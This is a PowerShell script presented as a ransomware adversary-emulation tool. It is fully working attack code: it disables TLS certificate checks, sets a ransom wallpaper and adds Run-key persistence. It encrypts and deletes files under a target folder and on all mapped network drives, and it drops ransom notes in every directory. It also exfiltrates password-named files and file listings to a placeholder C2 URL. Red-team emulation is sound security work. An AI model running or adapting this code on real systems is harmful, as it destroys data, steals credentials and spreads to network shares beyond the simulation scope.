<#
.SYNOPSIS
    Apex Pro Adversary Emulation Agent.
.DESCRIPTION
    Comprehensive script to simulate ransomware behavior.
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("Encrypt", "Decrypt")]
    $Mode, 

    [string]$TargetPath = "C:\SimulationData", 

    [string]$C2Url = "https://YOUR_C2_IP/api/v1/telemetry",

    [int]$Timer = 60
)

# Global SSL Bypass for Ad-Hoc/Self-Signed Certificates
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Shared AES-256 Key (32 bytes)
$Passphrase = "12345678901234567890123456789012"
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)

# --- SECTION 1: WALLPAPER HIJACK ---
$WP_Code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public const int SPI_SETDESKWALLPAPER = 0x0014;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;
    public static void Set(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
'@
Add-Type -TypeDefinition $WP_Code -ErrorAction SilentlyContinue

function Set-ApexWallpaper {
    Add-Type -AssemblyName System.Drawing
    $Path = "$env:TEMP\apex_bg.bmp"
    $Bmp = New-Object System.Drawing.Bitmap(1920,1080)
    $G = [System.Drawing.Graphics]::FromImage($Bmp)
    $G.Clear([System.Drawing.Color]::DarkRed)
    $Font = New-Object System.Drawing.Font("Impact", 80)
    $G.DrawString("SYSTEM ENCRYPTED", $Font, [System.Drawing.Brushes]::White, 400, 400)
    $G.DrawString("Contact Admin to Recover", (New-Object System.Drawing.Font("Arial", 40)), [System.Drawing.Brushes]::White, 550, 550)
    $Bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Bmp)
    $G.Dispose(); $Bmp.Dispose()
    [Wallpaper]::Set($Path)
}

# --- SECTION 2: CRYPTO ENGINE ---
function Invoke-ApexCipher {
    param ($Path, $Key, $Action)
    try {
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        if ($Action -eq "Encrypt") {
            $Aes.GenerateIV()
            $Enc = $Aes.CreateEncryptor()
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Out = $Enc.TransformFinalBlock($In, 0, $In.Length)
            [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
            Remove-Item $Path -Force
        } else {
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Aes.IV = $In[0..15]
            $Cipher = $In[16..($In.Length-1)]
            $Dec = $Aes.CreateDecryptor()
            $Plain = $Dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
            [System.IO.File]::WriteAllBytes($Path.Replace(".locked",""), $Plain)
            Remove-Item $Path -Force
        }
    } catch { Write-Warning "Access Denied: $Path" }
}

# --- SECTION 3: C2 EXFILTRATION (BINARY SYNCED) ---
function Send-ApexExfil {
    param ($DataManifest)
    $FinalPayload = if ($DataManifest -is [string]) { $DataManifest } else { $DataManifest | ConvertTo-Json -Compress }

    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $KeyBytes; $Aes.GenerateIV()
    $Enc = $Aes.CreateEncryptor()
    $PayloadBytes = [System.Text.Encoding]::UTF8.GetBytes($FinalPayload)
    $Cipher = $Enc.TransformFinalBlock($PayloadBytes, 0, $PayloadBytes.Length)
    
    $BinaryBlob = New-Object byte[] (16 + $Cipher.Length)
    [Array]::Copy($Aes.IV, 0, $BinaryBlob, 0, 16)
    [Array]::Copy($Cipher, 0, $BinaryBlob, 16, $Cipher.Length)
    
    try {
        $WC = New-Object System.Net.WebClient
        $WC.Headers.Add("Content-Type", "application/octet-stream")
        $WC.UploadData($C2Url, "POST", $BinaryBlob) | Out-Null
        Write-Host "[+] SUCCESS: Data Exfiltrated ($($BinaryBlob.Length) bytes)" -ForegroundColor Green
    } catch {
        Write-Host "[!!!] EXFIL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-ApexTheft {
    param ($FilePath)
    $FileStream = $null
    try {
        $FileName = Split-Path $FilePath -Leaf
        $FileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $Buffer = New-Object byte[] $FileStream.Length
        $FileStream.Read($Buffer, 0, $FileStream.Length) | Out-Null
        $FileStream.Close()

        $B64Content = [Convert]::ToBase64String($Buffer)
        $TheftPayload = "LOOT|$FileName|$B64Content"
        Send-ApexExfil -DataManifest $TheftPayload
    } catch { 
        if ($FileStream) { $FileStream.Close() }
        Write-Host "[!] Theft Failed for $FilePath" -ForegroundColor Gray 
    }
}

# --- SECTION 4: MAIN EXECUTION ---
if ($Mode -eq "Encrypt") {
    Write-Host "[!] INITIATING IMPACT PHASE..." -ForegroundColor Red
    Set-ApexWallpaper

    $CurrentPath = $MyInvocation.MyCommand.Path
    $RunValue = if ($CurrentPath -like "*.exe") { "`"$CurrentPath`"" } else { "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`" -Mode Encrypt" }
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -Value $RunValue -Force | Out-Null

    $Targets = @($TargetPath)
    $Targets += Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot } | Select-Object -ExpandProperty Root

    foreach ($T in $Targets) {
        if (Test-Path $T) {
            $Files = Get-ChildItem $T -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
            if ($Files) { 
                Send-ApexExfil -DataManifest ($Files | Select-Object Name, Length) 
                foreach ($F in $Files) { 
                    if ($F.Name -like "*ADMIN_PASSWORDS*" -or $F.Name -like "*canary*") {
                        Write-Host "[!] TARGET IDENTIFIED: $($F.Name). Stealing..." -ForegroundColor Yellow
                        Invoke-ApexTheft -FilePath $F.FullName
                        Start-Sleep -Milliseconds 500
                    }
                    Invoke-ApexCipher -Path $F.FullName -Key $KeyBytes -Action "Encrypt" 
                }
            }
            $Dirs = Get-ChildItem $T -Recurse -Directory -ErrorAction SilentlyContinue; $Dirs += Get-Item $T
            foreach ($D in $Dirs) { 
                "<html><body style='background-color:black;color:red;text-align:center;'><h1>!!! CONTACT ADMIN TO RECOVER DATA !!!</h1></body></html>" | Out-File (Join-Path $D.FullName "RECOVER_FILES_NOW.html") -Force 
            }
        }
    }

    $End = (Get-Date).AddSeconds($Timer)
    while ((Get-Date) -lt $End) {
        Write-Host "`r[!] DATA WIPE IN: $(($End - (Get-Date)).ToString('mm\:ss'))" -NoNewline -ForegroundColor Red
        Start-Sleep 1
    }
} 
else {
    Write-Host "[*] INITIATING RECOVERY PHASE..." -ForegroundColor Green
    Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | ForEach-Object { Invoke-ApexCipher -Path $_.FullName -Key $KeyBytes -Action "Decrypt" }
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -ErrorAction SilentlyContinue
}